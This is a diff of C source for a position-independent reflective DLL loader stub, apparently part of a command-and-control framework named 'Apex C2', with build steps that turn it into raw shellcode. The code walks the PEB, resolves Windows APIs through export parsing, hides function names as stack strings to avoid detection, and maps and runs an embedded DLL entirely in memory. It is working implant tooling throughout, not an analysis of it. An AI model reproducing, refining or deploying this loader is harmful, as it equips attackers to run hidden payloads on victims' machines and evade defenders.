@@ -2,12 +2,11 @@
  * PIC Reflective PE/DLL Loader Stub
  *
  * This is compiled into a tiny position-independent binary that:
- *   1. Finds its own address in memory (call/pop trick)
+ *   1. Locates the embedded PE data via marker-relative addressing
  *   2. Walks the PEB to locate kernel32.dll
- *   3. Resolves VirtualAlloc, LoadLibraryA, GetProcAddress via export table parsing
- *   4. Reads the embedded PE (DLL) appended after this stub
- *   5. Maps sections, processes relocations, resolves imports
- *   6. Calls DllMain(DLL_PROCESS_ATTACH)
+ *   3. Resolves VirtualAlloc, LoadLibraryA, GetProcAddress, VirtualProtect
+ *   4. Maps sections, processes relocations, resolves imports
+ *   5. Calls DllMain(DLL_PROCESS_ATTACH)
  *
  * Build:
  *   x86_64-w64-mingw32-gcc -Os -nostdlib -nostartfiles -fno-stack-protector \
@@ -16,24 +15,22 @@
  *   x86_64-w64-mingw32-objcopy -O binary -j .text pic_stub.exe pic_stub.bin
  *
  * The combiner tool (gen_shellcode) finds the 8-byte marker 0x4150455850454F46
- * in the stub binary and replaces it with the actual stub size (= offset to PE data).
- *
- * Copyright (c) 2026 Apex C2 Framework
+ * and replaces it with (stub_size - marker_offset), i.e. the byte distance
+ * FROM the marker TO the start of the embedded PE data.
  */
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
-/* ── Type definitions (avoid CRT headers) ────────────────── */
+/* ── Type definitions (avoid CRT) ────────────────────────── */
 
 typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
 typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
 typedef LPVOID  (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL    (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
-typedef VOID    (WINAPI *fn_RtlMoveMemory)(PVOID, const VOID*, SIZE_T);
 typedef BOOL    (WINAPI *fn_DllMain)(HINSTANCE, DWORD, LPVOID);
 
-/* ── PEB structures (for kernel32 resolution) ────────────── */
+/* ── PEB structures ──────────────────────────────────────── */
 
 typedef struct _UNICODE_STRING_PEB {
     USHORT Length;
@@ -68,24 +65,30 @@ typedef struct _PEB_CUSTOM {
     PEB_LDR_DATA_PEB *Ldr;
 } PEB_CUSTOM;
 
-/* Marker: the combiner tool replaces this with the actual stub size */
+/*
+ * Marker: the combiner tool replaces this 8-byte value with
+ * (stub_size - marker_offset) = distance from &g_pe_offset to PE data.
+ */
 #define PE_OFFSET_MARKER 0x4150455850454F46ULL  /* "APEXPEOF" */
 
-/* ── Helpers (all inline, no CRT) ────────────────────────── */
+static volatile ULONGLONG g_pe_offset
+    __attribute__((used, section(".text"))) = PE_OFFSET_MARKER;
 
-static inline void *pic_memcpy(void *dst, const void *src, unsigned long long n) {
+/* ── Helpers (all inline, no CRT, no .rdata strings) ─────── */
+
+static inline void *pic_memcpy(void *dst, const void *src, ULONGLONG n) {
     unsigned char *d = (unsigned char *)dst;
     const unsigned char *s = (const unsigned char *)src;
     while (n--) *d++ = *s++;
     return dst;
 }
 
-static inline void pic_memset(void *dst, int val, unsigned long long n) {
+static inline void pic_memset(void *dst, int val, ULONGLONG n) {
     unsigned char *d = (unsigned char *)dst;
     while (n--) *d++ = (unsigned char)val;
 }
 
-static inline int pic_strcmp_ci_w(const WCHAR *a, const WCHAR *b) {
+static inline int pic_wcscmp_ci(const WCHAR *a, const WCHAR *b) {
     while (*a && *b) {
         WCHAR ca = *a, cb = *b;
         if (ca >= 'A' && ca <= 'Z') ca += 32;
@@ -108,34 +111,27 @@ static inline int pic_strcmp(const char *a, const char *b) {
 
 static HMODULE find_kernel32(void) {
     PEB_CUSTOM *peb;
-#if defined(_M_X64) || defined(__x86_64__)
     __asm__ volatile ("mov %%gs:0x60, %0" : "=r"(peb));
-#else
-    __asm__ volatile ("mov %%fs:0x30, %0" : "=r"(peb));
-#endif
 
     PEB_LDR_DATA_PEB *ldr = peb->Ldr;
     LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
     LIST_ENTRY *entry = head->Flink;
 
-    /* Stack string: "kernel32.dll" */
     WCHAR k32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
 
     while (entry != head) {
         LDR_DATA_TABLE_ENTRY_PEB *mod =
-            (LDR_DATA_TABLE_ENTRY_PEB *)((BYTE*)entry -
-                sizeof(LIST_ENTRY)); /* offset InMemoryOrderLinks */
+            (LDR_DATA_TABLE_ENTRY_PEB *)((BYTE*)entry - sizeof(LIST_ENTRY));
         if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
-            if (pic_strcmp_ci_w(mod->BaseDllName.Buffer, k32) == 0) {
+            if (pic_wcscmp_ci(mod->BaseDllName.Buffer, k32) == 0)
                 return (HMODULE)mod->DllBase;
-            }
         }
         entry = entry->Flink;
     }
     return NULL;
 }
 
-/* ── Parse PE export table to find function by name ──────── */
+/* ── Parse PE export table ───────────────────────────────── */
 
 static FARPROC find_export(HMODULE hMod, const char *funcName) {
     BYTE *base = (BYTE *)hMod;
@@ -154,24 +150,25 @@ static FARPROC find_export(HMODULE hMod, const char *funcName) {
 
     for (DWORD i = 0; i < exp->NumberOfNames; i++) {
         const char *name = (const char *)(base + names[i]);
-        if (pic_strcmp(name, funcName) == 0) {
+        if (pic_strcmp(name, funcName) == 0)
             return (FARPROC)(base + funcs[ordinals[i]]);
-        }
     }
     return NULL;
 }
 
 /* ── Reflective PE mapper ────────────────────────────────── */
 
-static BYTE *map_pe(BYTE *rawPE, fn_VirtualAlloc pVirtualAlloc,
-                    fn_LoadLibraryA pLoadLibraryA,
-                    fn_GetProcAddress pGetProcAddress) {
+static BYTE *map_pe(BYTE *rawPE,
+                    fn_VirtualAlloc  pVirtualAlloc,
+                    fn_LoadLibraryA  pLoadLibraryA,
+                    fn_GetProcAddress pGetProcAddress,
+                    fn_VirtualProtect pVirtualProtect) {
 
     IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawPE;
-    if (dos->e_magic != 0x5A4D) return NULL; /* "MZ" */
+    if (dos->e_magic != 0x5A4D) return NULL;
 
     IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawPE + dos->e_lfanew);
-    if (nt->Signature != 0x00004550) return NULL; /* "PE\0\0" */
+    if (nt->Signature != 0x00004550) return NULL;
 
     SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
     BYTE *mapped = (BYTE *)pVirtualAlloc(NULL, imageSize,
@@ -179,7 +176,7 @@ static BYTE *map_pe(BYTE *rawPE, fn_VirtualAlloc pVirtualAlloc,
                                           PAGE_READWRITE);
     if (!mapped) return NULL;
 
-    /* Copy headers */
+    /* Copy PE headers */
     pic_memcpy(mapped, rawPE, nt->OptionalHeader.SizeOfHeaders);
 
     /* Copy sections */
@@ -218,16 +215,14 @@ static BYTE *map_pe(BYTE *rawPE, fn_VirtualAlloc pVirtualAlloc,
                     WORD offset = entries[i] & 0xFFF;
                     BYTE *patch = mapped + reloc->VirtualAddress + offset;
 
-                    if (type == IMAGE_REL_BASED_DIR64) {
+                    if (type == IMAGE_REL_BASED_DIR64)
                         *(ULONGLONG *)patch += delta;
-                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
+                    else if (type == IMAGE_REL_BASED_HIGHLOW)
                         *(DWORD *)patch += (DWORD)delta;
-                    } else if (type == IMAGE_REL_BASED_HIGH) {
+                    else if (type == IMAGE_REL_BASED_HIGH)
                         *(WORD *)patch += HIWORD(delta);
-                    } else if (type == IMAGE_REL_BASED_LOW) {
+                    else if (type == IMAGE_REL_BASED_LOW)
                         *(WORD *)patch += LOWORD(delta);
-                    }
-                    /* type == 0 → IMAGE_REL_BASED_ABSOLUTE → skip */
                 }
                 reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
             }
@@ -252,11 +247,9 @@ static BYTE *map_pe(BYTE *rawPE, fn_VirtualAlloc pVirtualAlloc,
 
             while (*thunk) {
                 if (*thunk & (1ULL << 63)) {
-                    /* Import by ordinal */
                     WORD ordinal = (WORD)(*thunk & 0xFFFF);
                     *iat = (ULONGLONG)pGetProcAddress(hDll, (LPCSTR)(ULONG_PTR)ordinal);
                 } else {
-                    /* Import by name */
                     IMAGE_IMPORT_BY_NAME *ibn =
                         (IMAGE_IMPORT_BY_NAME *)(mapped + (DWORD)*thunk);
                     *iat = (ULONGLONG)pGetProcAddress(hDll, ibn->Name);
@@ -275,75 +268,60 @@ static BYTE *map_pe(BYTE *rawPE, fn_VirtualAlloc pVirtualAlloc,
         DWORD chars = sec[i].Characteristics;
         BOOL exec  = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
         BOOL write = (chars & IMAGE_SCN_MEM_WRITE) != 0;
-        BOOL read  = (chars & IMAGE_SCN_MEM_READ) != 0;
 
-        if (exec && write && read) prot = PAGE_EXECUTE_READWRITE;
-        else if (exec && read) prot = PAGE_EXECUTE_READ;
-        else if (exec) prot = PAGE_EXECUTE;
-        else if (write && read) prot = PAGE_READWRITE;
-        else if (write) prot = PAGE_READWRITE;
-        else if (read) prot = PAGE_READONLY;
+        if (exec && write)     prot = PAGE_EXECUTE_READWRITE;
+        else if (exec)         prot = PAGE_EXECUTE_READ;
+        else if (write)        prot = PAGE_READWRITE;
 
         DWORD sz = sec[i].Misc.VirtualSize;
         if (sz == 0) sz = sec[i].SizeOfRawData;
         if (sz > 0) {
             DWORD old;
-            fn_VirtualProtect pVP = (fn_VirtualProtect)
-                pGetProcAddress(find_kernel32(), "VirtualProtect");
-            if (pVP) pVP(mapped + sec[i].VirtualAddress, sz, prot, &old);
+            pVirtualProtect(mapped + sec[i].VirtualAddress, sz, prot, &old);
         }
     }
 
-    /* Update ImageBase in mapped headers */
     mappedNt->OptionalHeader.ImageBase = (ULONGLONG)mapped;
-
     return mapped;
 }
 
 /* ── Shellcode entry point ───────────────────────────────── */
 
-void _start(void);
-
-/* We place the marker in a global so it's easy to find in the .text section */
-static volatile ULONGLONG g_pe_offset __attribute__((used, section(".text"))) = PE_OFFSET_MARKER;
-
 void _start(void) {
     /*
-     * Find the start of _start via call/pop.
-     * call pushes the address of the next instruction; we subtract to get _start.
+     * Locate the embedded PE via marker-relative addressing.
+     *
+     * g_pe_offset lives in .text and is accessed via RIP-relative addressing
+     * (x86_64 default). Its value was patched by gen_shellcode to be:
+     *     (total_stub_size - marker_offset_in_stub)
+     * which is the byte distance FROM &g_pe_offset TO the PE data.
+     *
+     * This works regardless of where _start sits within the stub binary.
      */
-    BYTE *self;
-    __asm__ volatile (
-        "call 1f\n"
-        "1: pop %0\n"
-        "sub %0, (1b - _start)\n"
-        : "=r"(self)
-        :
-        : "memory"
-    );
+    ULONGLONG offset_from_marker = g_pe_offset;
+    BYTE *pe_data = (BYTE *)&g_pe_offset + offset_from_marker;
 
-    /* Read the PE offset — patched by the combiner tool */
-    ULONGLONG pe_offset = g_pe_offset;
-
-    BYTE *pe_data = self + pe_offset;
-
-    /* ── Resolve kernel32 functions ── */
+    /* ── Resolve kernel32 functions via PEB ── */
     HMODULE hK32 = find_kernel32();
     if (!hK32) return;
 
-    /* Stack strings for function names */
-    char sLoadLibraryA[]  = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
+    /* All function name strings on the stack — no .rdata references */
+    char sLoadLibraryA[]   = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
     char sGetProcAddress[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};
-    char sVirtualAlloc[]  = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
+    char sVirtualAlloc[]   = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
+    char sVirtualProtect[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
 
-    fn_LoadLibraryA  pLoadLibraryA  = (fn_LoadLibraryA)find_export(hK32, sLoadLibraryA);
+    fn_LoadLibraryA   pLoadLibraryA   = (fn_LoadLibraryA)  find_export(hK32, sLoadLibraryA);
     fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)find_export(hK32, sGetProcAddress);
-    fn_VirtualAlloc  pVirtualAlloc  = (fn_VirtualAlloc)find_export(hK32, sVirtualAlloc);
+    fn_VirtualAlloc   pVirtualAlloc   = (fn_VirtualAlloc)  find_export(hK32, sVirtualAlloc);
+    fn_VirtualProtect pVirtualProtect = (fn_VirtualProtect)find_export(hK32, sVirtualProtect);
 
-    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc) return;
+    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc || !pVirtualProtect)
+        return;
 
     /* ── Map the embedded PE ── */
-    BYTE *mapped = map_pe(pe_data, pVirtualAlloc, pLoadLibraryA, pGetProcAddress);
+    BYTE *mapped = map_pe(pe_data, pVirtualAlloc, pLoadLibraryA,
+                          pGetProcAddress, pVirtualProtect);
     if (!mapped) return;
 
     /* ── Call entry point ── */
